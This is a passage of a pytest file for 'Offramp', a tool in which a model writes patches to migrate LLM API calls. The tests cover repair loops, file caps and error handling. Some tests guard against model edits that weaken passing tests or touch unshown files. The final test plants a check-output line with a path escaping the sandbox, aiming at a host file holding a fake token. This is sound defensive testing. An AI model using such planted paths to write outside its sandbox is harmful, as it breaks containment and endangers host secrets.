    repo = work_dir("tiny-built") / "src"
    shutil.copytree(TINY, repo)
    (repo / "tinyapp" / "greet.py").write_text(BUILT_GREET)
    write_case(repo, "cs_01", {"name": "Ana"}, "You write one-line greetings.", "Greet Ana.")
    old = 'create(model="gpt-4o-mini", max_tokens=32, messages=messages)'
    thinking = 'extra_body={"chat_template_kwargs": {"enable_thinking": False}}'
    args = [MIGRATED, "max_tokens=32,", "temperature=0.0,", f"{thinking},", "messages=messages,"]
    new = "create(\n" + "".join(f"        {a}\n" for a in args) + "    )"
    return repo, Edit(path="tinyapp/greet.py", search=old, replace=new)


FALLBACK = "Offramp could not rewrite this call; a model-written call is not shipped"
UNMAPPED = "Offramp could not map how this call's reply is read; a model-written mapping is not shipped"


@pytest.mark.parametrize("shape", ["messages-built-first", "async-messages-built-first", "reply-used-whole"])
def test_a_call_or_reply_the_code_cannot_rewrite_goes_to_manual_review_before_any_model_call(shape):
    """Ruling (round 4): code that ships is code-only. Each allowance for a model-written call or reply
    mapping let a review change the shipped request, so the site is a manual review and no model is asked."""
    repo, _ = tiny_built()  # greet builds its messages before the call; a case drives it
    sites = tiny_sites()
    if shape == "async-messages-built-first":
        (repo / "tinyapp" / "greet.py").write_text(DRIVEN.replace(
            "    response = await", "    messages = []\n    response = await").replace(
            "        messages=[\n", "        messages=messages + [\n"))  # fmt: skip
    if shape == "reply-used-whole":  # returned as it is: no OpenAI reading of it can be written by code
        (repo / "tinyapp" / "greet.py").write_text(ANTHROPIC_GREET)
        sites = [s.model_copy(update={"sdk": "anthropic"}) if s.id == "cs_01" else s for s in sites]
    llm = patcher_llm()  # no reply queued: nobody may be asked (shout is green on Offramp's changes alone)

    result = compose_patches(repo, sites, tiny_verdicts(), tiny_adapters(), llm, work_dir("tiny-built-run"),
                             config=CONFIG, build_request=BUILD,
                             sandbox_factory=lambda r: FakeSandbox(r, precheck=True))  # fmt: skip

    greet = verdict(result, "cs_01")
    assert greet.decision == "MANUAL_REVIEW"
    assert greet.reason == (UNMAPPED if shape == "reply-used-whole" else FALLBACK)
    assert llm.calls == [] and "tinyapp/greet.py" not in result.files
    assert verdict(result, "cs_03").decision == "MIGRATE"


def test_a_repair_stopped_by_the_budget_keeps_the_first_failure_in_the_reason():
    breaking = migrate("tinyapp/greet.py", extra=[BREAK_GREET])
    llm = patcher_llm(
        breaking, BudgetExceeded("Ultra agent call cap reached (0)"), migrate("tinyapp/shout.py")
    )

    reason = verdict(run(llm, results=[True, True, False, True]), "cs_01").reason

    assert reason.startswith(
        "patch not composed: Ultra agent call cap reached (0); last failure: repo checks failed"
    )


def test_once_a_literal_is_split_the_shorter_one_left_of_it_stays():
    """cs_01's live patch: after its value moved to its own line, the dict key was wrapped as well."""
    value = "Subject: Order confirmation email not received and order missing from dashboard"
    lines = [
        "def test_x(call):",
        "    assert call == {",
        '        "role": "user",',
        f'        "content": "{value}",',
    ]
    source = "\n".join([*lines, "    }", ""])

    wrapped = wrap_long_strings(source, {4}, 88)

    assert '        "content": (\n' in wrapped and '("content")' not in wrapped
    assert ast.dump(ast.parse(wrapped)) == ast.dump(ast.parse(source))


SOURCES_TEST = """def test_request_contract():
    client = FakeOpenAI("Within 30 days [returns].")

    reply = answer_question(client, "refund?", [RETURNS])

    assert reply.sources == ["returns"]
    (call,) = client.calls
    assert call["model"] == "gpt-4o"
    user = call["messages"][1]["content"]
    assert "[returns]" in user
"""


def test_a_long_block_copied_with_a_slip_lands_only_its_intended_changes():
    """cs_06's Ultra repair: a 45-line SEARCH with one value mis-copied was rejected as not found. Review I1
    (probe 2): applied over the window, the slip then replaced the real assertion with its copy."""
    slip = SOURCES_TEST.rstrip("\n").replace('assert reply.sources == ["returns"]', "assert reply.sources")
    intended = slip.replace('== "gpt-4o"', f'== "{LIGHTNING}"').replace('["messages"][1]', '["messages"][-1]')
    files = {"t.py": SOURCES_TEST}

    assert _apply([Edit(path="t.py", search=slip, replace=intended)], files) == []

    assert 'assert reply.sources == ["returns"]\n' in files["t.py"]  # the real assertion is intact
    assert f'== "{LIGHTNING}"' in files["t.py"] and '["messages"][-1]' in files["t.py"]
    gone = intended.replace("    assert reply.sources\n", "")  # the slip's own line removed: a conflict
    assert (
        "not found" in _apply([Edit(path="t.py", search=slip, replace=gone)], {"t.py": SOURCES_TEST})[0].text
    )
    short = Edit(path="t.py", search='    reply = x\n    assert reply.sources == ["returns"]', replace="x")
    assert "not found" in _apply([short], {"t.py": SOURCES_TEST})[0].text  # a short block must match exactly
    twice = {"t.py": SOURCES_TEST + "\n\n" + SOURCES_TEST.replace("test_request_contract", "test_again")}
    lone = Edit(path="t.py", search=slip.replace("def test_request_contract():", ""), replace="x")
    assert "not found" in _apply([lone], twice)[0].text  # more than one place: never guess


def test_a_repair_keeps_the_previous_edits_of_files_it_leaves_out():
    """Repairs that resent 'a complete new set' kept dropping blocks that had worked (cs_06, live)."""
    repo = work_dir("tiny-two-tests") / "src"
    shutil.copytree(TINY, repo)
    more = "tests/test_greet_more.py"
    (repo / more).write_text("from tinyapp.greet import greet\n\n\ndef test_greet_is_a_function():\n"
                             "    assert callable(greet)\n")  # fmt: skip
    pins = Edit(path=more, search="def test_greet_is_a_function():",
                replace="# pins updated\ndef test_greet_is_a_function():")  # fmt: skip
    fix = PatchEdits(edits=[UNBREAK_GREET])  # names the other test file only: `more` keeps try 1's edit
    llm = patcher_llm(PatchEdits(edits=[pins, BREAK_GREET]), fix, migrate("tinyapp/shout.py"))

    result = run(llm, results=[True, True, False, True, True], repo=repo, name="tiny-two-tests-run")

    assert "edits already checked stay in" in llm.calls[1]["messages"][-1]["content"]
    assert verdict(result, "cs_01").decision == "MIGRATE" and "# pins updated" in result.files[more]
    assert '"Hi Ana!"' in result.files[TESTS]  # the test file is the repair's own version


def test_a_repair_is_shown_and_applied_to_the_file_as_its_last_checked_try_left_it():
    """Live run 6, cs_01: try 1 rewrote a test (checked, red); the repair's SEARCH spanned lines only that
    edit wrote, but repair blocks were applied to the first message's text, which the repair turn never
    showed: 'search text not found'. A repair now meets, and is shown, the file as checked, the imports
    Offramp added to it included."""
    line = 'assert greet(FakeClient("  Hi Ana! "), "Ana") == "Hi Ana!"'
    pinned = 'assert greet(FakeClient(json.loads(\'"  Hi Ana! "\')), "Ana") == "Hi Ana"'  # imports json
    try1 = migrate(GREET, extra=[Edit(path=TESTS, search=line, replace=pinned)])
    fix = PatchEdits(edits=[Edit(path=TESTS, search=pinned, replace=pinned.replace('"Hi Ana"', '"Hi Ana!"'))])
    llm = patcher_llm(try1, fix, migrate(SHOUT))

    result = run(llm, results=[True, True, False, True, True, True])

    repair = llm.calls[1]["messages"][-1]["content"]
    now = repair.split(f"### {TESTS} (editable)\n```python\n")[1].split("\n```")[0]
    assert pinned in now and "import json\n" in now and f"# migrated: {GREET}" in now  # as checked
    assert verdict(result, "cs_01").decision == "MIGRATE"
    final = result.files[TESTS]
    assert final.count("import json\n") == 1 and final.count(f"# migrated: {GREET}") == 1
    assert pinned.replace('"Hi Ana"', '"Hi Ana!"') in final


def test_a_repair_after_a_search_miss_shows_the_missed_file_again():
    """Live run 6, cs_03: a repair searched a tests/fakes.py that exists nowhere; the file had been shown
    only in the first message, 700 lines up. The file a SEARCH missed is shown again, as the next blocks
    meet it."""
    fakes = '"""Offline stand-ins."""\n\n\nclass FakeOpenAI:\n    pass\n'
    miss = 'patch rejected (patch rules): search text not found in tests/fakes.py: \'"""Test fakes for\''

    repair, again, left = _repair(miss, {"tests/fakes.py": fakes}, {"tests/fakes.py": fakes})

    assert (again, left) == (["tests/fakes.py"], frozenset())
    assert f"### tests/fakes.py (editable)\n```python\n{fakes.rstrip()}\n```" in repair
    assert "WHOLE FILE" in repair


DISPATCH = """COMMANDS = {"triage": lambda c: triage_ticket(token_factory_client(), c["subject"])}


def main(argv):
    if argv[0] == "search":
        return search_kb(OpenAI(), argv[1])
    elif argv[0] == "extract":
        return extract_order(token_factory_client(), argv[1])


def run_summary(thread):
    return summarize_thread(token_factory_client(), thread)
"""


def test_a_test_reaches_a_migrated_function_through_its_command_key_or_branch():
    assert reach_handles(DISPATCH, "triage_ticket") == {"triage_ticket", "triage"}  # a command table
    assert reach_handles(DISPATCH, "extract_order") == {"extract_order", "extract"}  # an argument branch
    assert reach_handles(DISPATCH, "summarize_thread") == {"summarize_thread", "run_summary"}  # a wrapper


def test_fake_twins_stay_only_in_tests_that_reach_the_migrated_function():
    twin = '    monkeypatch.setattr(cli, "token_factory_client", lambda: FakeOpenAI("x"))\n'
    other = '    monkeypatch.setattr(cli, "OpenAI", lambda: FakeOpenAI("x"))\n'
    source = (
        '@pytest.mark.parametrize("command", ["triage", "answer"])\n'
        f"def test_runs(monkeypatch, command):\n{other}{twin}    run([command])\n\n\n"
        f'def test_search(monkeypatch):\n{other}{twin}    run(["search", "q"])\n'
    )

    out = prune_twins(source, {twin}, {"triage_ticket", "triage"})

    assert out.count(twin) == 1 and out.index(twin) < out.index("def test_search")  # kept where reached
    assert out.count(other) == 2  # only Offramp's own twins are ever removed


def test_a_combined_repair_may_change_only_the_failing_tests_and_fakes():
    """Ultra's first live combined repair rewrote the fakes and tests that were passing; the next one then
    'fixed' a behavioural assertion it had broken."""
    weaken = Edit(path=TESTS, search='== "Ship it"', replace='== "Ship it!"')  # test_motto: not failing
    fix = Edit(path=TESTS, search="from types import", replace="# together\nfrom types import")
    llm = patcher_llm(migrate("tinyapp/greet.py"), migrate("tinyapp/shout.py"), PatchEdits(edits=[weaken]),
                      PatchEdits(edits=[fix]))  # fmt: skip

    result = run(llm, results=[True, True, True, True, False, True])  # FakeSandbox fails tests/...::x

    assert (
        "only the failing tests may change: tests/test_tinyapp.py::test_motto_returns_the_reply did"
        in (llm.calls[3]["messages"][-1]["content"])
    )
    assert result.combined == ["cs_01", "cs_03"] and '"Ship it!"' not in result.files[TESTS]


def test_a_second_combined_repair_meets_and_is_shown_the_tree_the_first_left():
    first = Edit(path=TESTS, search="from types import", replace="# together\nfrom types import")
    second = Edit(path=TESTS, search="# together\n", replace="# together, again\n")  # only the first wrote it
    llm = patcher_llm(migrate(GREET), migrate(SHOUT), PatchEdits(edits=[first]), PatchEdits(edits=[second]))

    result = run(llm, results=[True, True, True, True, False, False, True])

    assert result.combined == ["cs_01", "cs_03"] and result.combined_failure is None
    assert result.files[TESTS].startswith("# together, again\nfrom types import")
    shown = f"## Files now\n### {TESTS} (editable)\n```python\n# together\n"
    assert shown in llm.calls[3]["messages"][-1]["content"]


def test_a_combined_repair_does_not_apply_a_resent_checked_block_twice():
    first = Edit(path=TESTS, search="from types import", replace="# together\nfrom types import")
    second = Edit(path=TESTS, search="# together\n", replace="# together, again\n")
    llm = patcher_llm(
        migrate(GREET), migrate(SHOUT), PatchEdits(edits=[first]), PatchEdits(edits=[first, second])
    )

    result = run(llm, results=[True, True, True, True, False, False, True])

    assert result.combined_failure is None
    assert result.files[TESTS].startswith("# together, again\nfrom types import")  # `first` once


def test_checked_blocks_accumulate_so_one_resent_from_an_earlier_try_is_not_applied_again():
    fix = Edit(path=TESTS, search='"hi ana!"', replace='"Hi Ana!"')
    again = PatchEdits(edits=[*migrate(GREET).edits, fix])  # re-sends try 1's mark, checked two tries back
    llm = patcher_llm(
        migrate(GREET, extra=[BREAK_GREET]), PatchEdits(edits=[REBREAK_GREET]), again, migrate(SHOUT)
    )

    result = run(llm, results=[True, True, False, False, True, True, True])

    assert verdict(result, "cs_01").decision == "MIGRATE"
    assert result.files[TESTS].count(f"# migrated: {GREET}") == 1 and '"Hi Ana!"' in result.files[TESTS]


class TidyingSandbox(FakeSandbox):
    """Its formatter changes every file it is given on every run, code included (a numbered comment: the AST
    stays the same), so shipped code's checked text differs from the text the first message showed."""

    runs = 0

    def tidy(self, paths: list[str], format_code: bool = False) -> None:
        TidyingSandbox.runs += 1
        for p in paths:
            (self.repo / p).write_text((self.repo / p).read_text() + f"# tidied {TidyingSandbox.runs}\n")


def test_files_now_shows_only_editable_files_even_when_the_formatter_changed_shipped_code():
    llm = patcher_llm(migrate(GREET, extra=[BREAK_GREET]), PatchEdits(edits=[UNBREAK_GREET]), migrate(SHOUT))

    result = run(llm, results=[True, True, False, True, True, True], box=TidyingSandbox)

    repair = llm.calls[1]["messages"][-1]["content"]
    assert f"### {TESTS} (editable)\n" in repair and "# tidied" in repair  # the test file, as checked
    assert "### tinyapp/greet.py" not in repair  # read-only, though its checked text differs from the shown
    assert verdict(result, "cs_01").decision == "MIGRATE"


def test_files_now_is_capped_the_failures_own_files_first_and_the_rest_not_editable(monkeypatch):
    monkeypatch.setattr(patcher_module, "FILES_NOW_CHARS", 1)  # room for one file
    repo = work_dir("tiny-cap") / "src"
    shutil.copytree(TINY, repo)
    more = "tests/test_greet_more.py"
    (repo / more).write_text("from tinyapp.greet import greet\n\n\ndef test_greet_is_a_function():\n"
                             "    assert callable(greet)\n")  # fmt: skip
    pins = Edit(path=more, search="def test_greet_", replace="# pinned\ndef test_greet_")
    llm = patcher_llm(PatchEdits(edits=[pins, BREAK_GREET]), PatchEdits(edits=[UNBREAK_GREET]),
                      PatchEdits(edits=[UNBREAK_GREET]), migrate(SHOUT))  # fmt: skip

    result = run(llm, results=[True, True, False, True, True, True], repo=repo, name="tiny-cap-run",
                 output=f"FAILED {more}::test_greet_is_a_function")  # fmt: skip

    first, second = (c["messages"][-1]["content"] for c in llm.calls[1:3])
    assert f"## Files now\n### {more} (editable)" in first and f"### {TESTS} (editable)" not in first
    assert LEFT_OUT.format(files=f"`{TESTS}`") in first
    assert f"{TESTS} {NOT_SHOWN}" in second  # its block was refused, unseen; now the failure names it
    assert f"## Files now\n### {TESTS} (editable)" in second
    assert verdict(result, "cs_01").decision == "MIGRATE" and "# pinned" in result.files[more]


def test_each_file_has_one_copy_in_the_conversation_the_latest():
    fix = Edit(path=TESTS, search='"hi ana!"', replace='"Hi Ana!"')
    llm = patcher_llm(migrate(GREET, extra=[BREAK_GREET]), PatchEdits(edits=[REBREAK_GREET]),
                      PatchEdits(edits=[fix]), migrate(SHOUT))  # fmt: skip

    run(llm, results=[True, True, False, False, True, True, True])

    third = [m["content"] for m in llm.calls[2]["messages"] if m["role"] == "user"]
    copies = [i for i, text in enumerate(third) if f"### {TESTS} (editable)\n```python\n" in text]
    assert copies == [len(third) - 1] and '"hi ana!"' in third[-1]  # the latest, as try 2 left it
    assert (
        sum(text.count(SUPERSEDED.format(path=TESTS)) for text in third) == 2
    )  # the first message's, try 1's


def test_a_repair_that_redoes_an_undone_block_reports_that_trees_own_failure():
    """Review probe: X checked red, Y undid it (red), X sent again: X applies (it is no longer in the text),
    the tree is X's, checked already: its own failure and kind, never "no change"."""
    llm = patcher_llm(migrate(GREET, extra=[BREAK_GREET]), PatchEdits(edits=[UNBREAK_GREET]),
                      PatchEdits(edits=[BREAK_GREET]), migrate(SHOUT))  # fmt: skip
    boxes = []

    result = run(llm, results=[True, True, False, False, True], sandboxes=boxes)

    greet = verdict(result, "cs_01")
    assert greet.reason.startswith("the repair returned to a patch already checked; its failure: repo checks")
    assert (greet.patch_failure.kind, greet.patch_failure.tries) == ("checks_failed", 3)
    assert len(boxes[0].checks) == 7  # untouched, base, greet alone, X, Y, shout alone, shout: X once


def test_a_repair_that_leaves_a_checked_block_out_is_told_it_stays_and_reports_the_real_kind():
    """Review probe (the old protocol's habit): every block the file needs re-sent, the bad one left out."""
    llm = patcher_llm(migrate(GREET, extra=[BREAK_GREET]), migrate(GREET), migrate(SHOUT))

    result = run(llm, results=[True, True, False, True, True])

    greet = verdict(result, "cs_01")
    assert greet.reason.startswith(
        "every block of the repair is already applied, and leaving one out does not drop it; last failure: "
        "repo checks failed"
    )
    assert (greet.patch_failure.kind, greet.patch_failure.model_edit) == ("checks_failed", True)
    assert (
        "to drop one, send a block that restores the earlier text" in llm.calls[1]["messages"][-1]["content"]
    )


URL = "https://tf.test/v1/chat/completions"


def http_error(cls, status: int, body=None):
    return cls(
        f"Error code: {status}",
        response=httpx.Response(status, request=httpx.Request("POST", URL)),
        body=body,
    )


TOO_BIG = http_error(
    openai.BadRequestError, 400, {"error": {"message": "maximum context length is 131072 tokens"}}
)


@pytest.mark.parametrize(
    ("error", "why"),
    [
        (TOO_BIG, "was too large (HTTP 400)"),
        (http_error(openai.UnprocessableEntityError, 422), "was refused (HTTP 422)"),
    ],
    ids=["too-large", "refused"],
)
def test_a_provider_refusal_fails_only_its_site_with_a_reason_built_by_offramp(error, why):
    llm = patcher_llm(migrate(GREET, extra=[BREAK_GREET]), error, migrate(SHOUT))

    result = run(llm, results=[True, True, False, True, True])

    greet = verdict(result, "cs_01")
    assert greet.reason == (
        f"patch not composed: the model request {why}; last failure: repo checks failed on the patch "
        "(docker): FAILED tests/test_tinyapp.py::x"
    )
    assert greet.patch_failure == PatchFailure(kind="provider_error", last="checks_failed", tries=1,
                                               model_edit=True)  # fmt: skip
    assert manual_reason(greet)[0] == (
        "Token Factory refused a model request after 1 try at this site's patch; with the model's test edits "
        "applied, this repo's checks still failed."
    )
    assert verdict(result, "cs_03").decision == "MIGRATE"  # the run goes on


TRANSIENT_OR_ACCOUNT = [
    http_error(openai.RateLimitError, 429),
    http_error(openai.InternalServerError, 503),
    http_error(openai.AuthenticationError, 401),
    http_error(openai.APIStatusError, 402),  # out of credit
    http_error(openai.PermissionDeniedError, 403),
    http_error(openai.NotFoundError, 404),  # unknown model
    openai.APIConnectionError(request=httpx.Request("POST", URL)),
]


@pytest.mark.parametrize(
    "error", TRANSIENT_OR_ACCOUNT, ids=["429", "503", "401", "402", "403", "404", "connection"]
)
def test_a_transient_or_account_wide_provider_error_fails_the_run_so_it_can_be_resumed(error):
    with pytest.raises(type(error)):  # per site
        run(patcher_llm(migrate(GREET, extra=[BREAK_GREET]), error), results=[True, True, False])
    with pytest.raises(type(error)):  # in the combined repair
        run(patcher_llm(migrate(GREET), migrate(SHOUT), error), results=[True, True, True, True, False])


def test_a_provider_refusal_in_the_combined_repair_fails_only_that_repair():
    llm = patcher_llm(migrate(GREET), migrate(SHOUT), TOO_BIG)

    result = run(llm, results=[True, True, True, True, False, True, True])

    assert result.combined_failure.startswith(
        "combined repair not composed: the model request was too large (HTTP 400); last failure: repo"
    )
    assert result.combined == ["cs_01", "cs_03"]  # then added one at a time: each passes with the others


def no_supersede(messages, ledger, paths):  # stands in for a bookkeeping bug: nothing is ever superseded
    return messages


REAL_REPAIR = patcher_module._repair


def no_reshow(failure, now, live):  # another: a changed file is never shown again, its one copy stays stale
    return REAL_REPAIR(failure, now, live)[0], [], frozenset()


@pytest.mark.parametrize(("name", "broken"), [("_supersede", no_supersede), ("_repair", no_reshow)],
                         ids=["two-live-copies", "one-stale-copy"])  # fmt: skip
def test_a_stale_copy_ends_the_site_before_any_request(monkeypatch, caplog, name, broken):
    monkeypatch.setattr(patcher_module, name, broken)
    llm = patcher_llm(migrate(GREET, extra=[BREAK_GREET]), migrate(SHOUT))

    result = run(llm, results=[True, True, False, True])

    greet = verdict(result, "cs_01")
    assert greet.reason == f"internal: the conversation would show a stale copy of {TESTS}"
    assert (greet.patch_failure.kind, greet.patch_failure.tries) == ("internal_check", 1)
    assert sum("## Call site cs_01" in c["messages"][1]["content"] for c in llm.calls) == 1  # try 1 only
    assert any(
        r.levelname == "ERROR" and "nothing was sent to the model" in r.getMessage() for r in caplog.records
    )
    assert verdict(result, "cs_03").decision == "MIGRATE"


def test_a_stale_copy_ends_the_combined_repair_before_any_request(monkeypatch):
    monkeypatch.setattr(patcher_module, "_supersede", no_supersede)
    first = Edit(path=TESTS, search="from types import", replace="# together\nfrom types import")
    llm = patcher_llm(migrate(GREET), migrate(SHOUT), PatchEdits(edits=[first]))

    result = run(llm, results=[True, True, True, True, False, False, True, True])

    assert result.combined_failure == f"internal: the conversation would show a stale copy of {TESTS}"
    assert len(llm.calls) == 3  # two tries, one combined repair: its second request never went out


MORE = "tests/test_greet_more.py"
MORE_TEXT = (
    "from tinyapp.greet import greet\n\n\ndef test_greet_is_a_function():\n    assert callable(greet)\n"
)
PIN_MORE = Edit(path=MORE, search="def test_greet_", replace="# pinned\ndef test_greet_")
UNPIN_MORE = Edit(path=MORE, search="# pinned\ndef test_greet_", replace="def test_greet_")  # its first text


def two_test_files(name: str) -> Path:
    repo = work_dir(name) / "src"
    shutil.copytree(TINY, repo)
    (repo / MORE).write_text(MORE_TEXT)
    return repo


def copies(messages: list[dict], path: str) -> list[int]:
    """The user turns holding a copy of `path`."""
    return [
        i
        for i, m in enumerate(messages)
        if m["role"] == "user" and f"### {path} (editable)\n```" in m["content"]
    ]


def test_a_file_restored_to_its_first_text_is_shown_again_as_it_is_now():
    """Re-review 1, Important: try 1 changed two test files; repair 1 restored one to its first-message text
    (as the repair text says to drop an edit). That text had been superseded, and nothing showed it again."""
    fix = Edit(path=TESTS, search='"hi ana!"', replace='"Hi Ana!"')
    tries = [[*migrate(GREET).edits, PIN_MORE, BREAK_GREET], [UNPIN_MORE, REBREAK_GREET], [fix]]
    llm = patcher_llm(*(PatchEdits(edits=t) for t in tries), migrate(SHOUT))
    repo = two_test_files("tiny-restore")

    result = run(
        llm, results=[True, True, False, False, True, True, True], repo=repo, name="tiny-restore-run"
    )

    third = llm.calls[2]["messages"]
    assert copies(third, MORE) == [len(third) - 1]  # one copy, in the latest turn: its first text again
    assert _file_block(MORE, "editable", MORE_TEXT) in third[-1]["content"]
    assert verdict(result, "cs_01").decision == "MIGRATE" and "# pinned" not in result.files.get(MORE, "")


HELPERS = "tests/helpers.py"


def with_a_helper(name: str) -> Path:
    """The tiny repo, its test importing a helper: the combined repair may edit both."""
    repo = work_dir(name) / "src"
    shutil.copytree(TINY, repo)
    (repo / HELPERS).write_text('GREETING = "Hi"\n')
    (repo / TESTS).write_text("from helpers import GREETING  # noqa: F401\n" + (repo / TESTS).read_text())
    return repo


def test_a_combined_repair_shows_again_a_file_restored_to_its_first_text(monkeypatch):
    monkeypatch.setattr(patcher_module, "TOGETHER_REPAIRS", 3)
    mark = Edit(path=TESTS, search="from types import", replace="# together\nfrom types import")
    helper = Edit(path=HELPERS, search='"Hi"', replace='"Hello"')
    back = Edit(path=HELPERS, search='"Hello"', replace='"Hi"')  # its first text
    remark = Edit(path=TESTS, search="# together\n", replace="# together, again\n")
    third_reply = Edit(path=TESTS, search="again", replace="3")
    tries = [[mark, helper], [back, remark], [third_reply]]
    llm = patcher_llm(migrate(GREET), migrate(SHOUT), *(PatchEdits(edits=t) for t in tries))
    repo = with_a_helper("tiny-ch")

    result = run(
        llm, results=[True, True, True, True, False, False, False, True], repo=repo, name="tiny-ch-run"
    )

    third = llm.calls[4]["messages"]
    assert copies(third, HELPERS) == [len(third) - 1]
    assert _file_block(HELPERS, "editable", 'GREETING = "Hi"\n') in third[-1]["content"]
    assert result.combined_failure is None and "\n# together, 3\nfrom types import" in result.files[TESTS]


def test_a_combined_repair_refuses_a_file_it_had_no_room_to_show(monkeypatch):
    monkeypatch.setattr(patcher_module, "FILES_NOW_CHARS", 1)
    mark = Edit(path=TESTS, search="from types import", replace="# together\nfrom types import")
    helper = Edit(path=HELPERS, search='"Hi"', replace='"Hello"')
    later = Edit(path=HELPERS, search='"Hello"', replace='"Hey"')  # HELPERS was left out: not editable
    llm = patcher_llm(
        migrate(GREET), migrate(SHOUT), PatchEdits(edits=[mark, helper]), PatchEdits(edits=[later])
    )

    repo = with_a_helper("tiny-cc")

    result = run(
        llm, results=[True, True, True, True, False, False, True, True, True], repo=repo, name="tiny-cc-run"
    )

    assert LEFT_OUT.format(files=f"`{HELPERS}`") in llm.calls[3]["messages"][-1]["content"]
    assert result.combined_failure == f"patch rejected (patch rules): {HELPERS} {NOT_SHOWN}"


def test_a_target_file_holding_another_files_header_line_is_not_a_copy_of_it():
    """Re-review 2, Minor B: the copies are Offramp's own record, never re-parsed from the messages' text."""
    repo = two_test_files("tiny-lookalike")
    lookalike = f'DOC = """\n### {TESTS} (editable)\n```python\n"""\n\n\n'
    (repo / MORE).write_text(MORE_TEXT.replace("def test_greet_", lookalike + "def test_greet_"))
    llm = patcher_llm(migrate(GREET, extra=[BREAK_GREET]), PatchEdits(edits=[UNBREAK_GREET]), migrate(SHOUT))

    result = run(llm, results=[True, True, False, True, True, True], repo=repo, name="tiny-lookalike-run")

    assert verdict(result, "cs_01").decision == "MIGRATE" and len(llm.calls) == 3


def test_a_whole_file_block_for_a_file_left_out_is_refused(monkeypatch):
    monkeypatch.setattr(patcher_module, "FILES_NOW_CHARS", 1)
    whole = Edit(path=TESTS, search="", replace=(TINY / TESTS).read_text(), whole=True)  # every test kept
    tries = [[*migrate(GREET).edits, PIN_MORE, BREAK_GREET], [whole], [UNBREAK_GREET]]
    llm = patcher_llm(*(PatchEdits(edits=t) for t in tries), migrate(SHOUT))

    result = run(llm, results=[True, True, False, True, True, True], repo=two_test_files("tiny-whole"),
                 name="tiny-whole-run", output=f"FAILED {MORE}::test_greet_is_a_function")  # fmt: skip

    assert f"{TESTS} {NOT_SHOWN}" in llm.calls[2]["messages"][-1]["content"]
    assert verdict(result, "cs_01").decision == "MIGRATE"


def test_a_block_relabelled_to_a_file_left_out_is_refused_too(monkeypatch):
    """Re-review 1, Minor 1: a block labelled with a shown file whose SEARCH is only in the left-out one."""
    monkeypatch.setattr(patcher_module, "FILES_NOW_CHARS", 1)
    sneaky = Edit(path=MORE, search='"Hi Ana"', replace='"Hi Ana!"')  # that text is in TESTS only
    llm = patcher_llm(PatchEdits(edits=[PIN_MORE, BREAK_GREET]), PatchEdits(edits=[sneaky]),
                      PatchEdits(edits=[UNBREAK_GREET]), migrate(SHOUT))  # fmt: skip

    result = run(llm, results=[True, True, False, True, True, True], repo=two_test_files("tiny-relabel"),
                 name="tiny-relabel-run", output=f"FAILED {MORE}::test_greet_is_a_function")  # fmt: skip

    assert f"{TESTS} {NOT_SHOWN}" in llm.calls[2]["messages"][-1]["content"]
    assert verdict(result, "cs_01").decision == "MIGRATE"


def test_files_now_cap_edges(monkeypatch):
    monkeypatch.setattr(patcher_module, "FILES_NOW_CHARS", 10)
    now = {"tests/test_x.py": "x" * 50, "a/tests/test_x.py": "y" * 5, "tests/helper.py": "z" * 5}
    stale = dict.fromkeys(now, "old")

    _, again, left = _repair("FAILED a/tests/test_x.py::t", now, stale)
    assert (again, left) == (
        ["a/tests/test_x.py", "tests/helper.py"],
        {"tests/test_x.py"},
    )  # by path, not substring
    _, again, left = _repair("FAILED tests/test_x.py::t", now, stale)
    assert again == ["tests/test_x.py"]  # named: shown though alone past the cap; the rest left out
    assert left == {"a/tests/test_x.py", "tests/helper.py"}
    _, again, left = _repair("FAILED a/tests/test_x.py::t | FAILED tests/test_x.py::u", now, stale)
    assert (again, left) == (["a/tests/test_x.py", "tests/test_x.py"], {"tests/helper.py"})  # both named
    miss = "patch rejected (patch rules): search text not found in tests/helper.py: 'q'"
    text, again, left = _repair(miss, now, dict(now))  # a miss in an unchanged file
    assert (again, left) == (["tests/helper.py"], frozenset()) and "Also changed" not in text


CLI_TEST = """@pytest.mark.parametrize(
    ("command", "openai_reply", "blocks"),
    [("triage", "billing", []), ("next-step", None, ["b"]), ("summarize", None, ["s"]), ("refund", "r", [])],
)
def test_runs(monkeypatch, command, openai_reply, blocks):
    monkeypatch.setattr(cli, "OpenAI", lambda: FakeOpenAI(openai_reply))
    monkeypatch.setattr(cli, "token_factory_client", lambda: FakeOpenAI(openai_reply))
    monkeypatch.setattr(cli, "Anthropic", lambda: FakeAnthropic(*blocks))
    monkeypatch.setattr(
        cli, "token_factory_client", lambda: FakeAnthropic(*blocks)
    )
    run([command])
"""
OPENAI_TWIN = '    monkeypatch.setattr(cli, "token_factory_client", lambda: FakeOpenAI(openai_reply))\n'
ANTHROPIC_TWIN = '    monkeypatch.setattr(cli, "token_factory_client", lambda: FakeAnthropic(*blocks))\n'


def test_twins_of_sites_from_both_sdks_become_one_fake_chosen_per_case():
    """Run 2 (round 2): merged, the Anthropic twin served every case and the OpenAI sites' cases failed."""
    sites = [({OPENAI_TWIN}, {"triage_ticket", "triage"}), ({ANTHROPIC_TWIN}, {"next_action", "next-step"}),
             ({ANTHROPIC_TWIN}, {"summarize_thread", "summarize"})]  # fmt: skip

    out = unify_twins(CLI_TEST, sites)

    assert out.count('"token_factory_client"') == 1 and 'cli, "OpenAI"' in out and 'cli, "Anthropic"' in out
    assert (
        '        (lambda: FakeAnthropic(*blocks))\n        if command in ("next-step", "summarize")\n'
        "        else (lambda: FakeOpenAI(openai_reply)),\n    )\n    run([command])\n"
    ) in out
    assert unify_twins(CLI_TEST, sites[:1]) == CLI_TEST  # one site's twin: nothing to choose between
    unnamed = CLI_TEST.replace('"next-step"', '"other"').replace('"summarize"', '"other"')
    assert unify_twins(unnamed, sites) == unnamed  # no parameter tells the sites apart: left to the repair


def test_a_path_in_the_check_output_never_reaches_a_host_file():
    """Review C1 (probe 7): the target's tests print a FAILED line naming a file outside the copy."""
    host = work_dir("host-secret") / "host_secret" / "tests" / "creds.py"
    host.parent.mkdir(parents=True)
    host.write_text("TOKEN = 'secret-value'\n")
    rel = os.path.relpath(host, ROOT / "var" / "test-sandbox" / "tiny-c1" / "repo")
    planted = f"FAILED {rel}::test_x\nFAILED tests/test_tinyapp.py::x"
    steal = PatchEdits(
        edits=[Edit(path=rel, search="TOKEN = 'secret-value'", replace="TOKEN = 'overwritten'")]
    )
    llm = patcher_llm(migrate("tinyapp/greet.py"), migrate("tinyapp/shout.py"), steal, steal)

    result = run(llm, results=[True, True, True, True, False], name="tiny-c1", output=planted)

    assert host.read_text() == "TOKEN = 'secret-value'\n"  # never written
    sent = [m["content"] for c in llm.calls for m in c["messages"] if m["role"] != "assistant"]
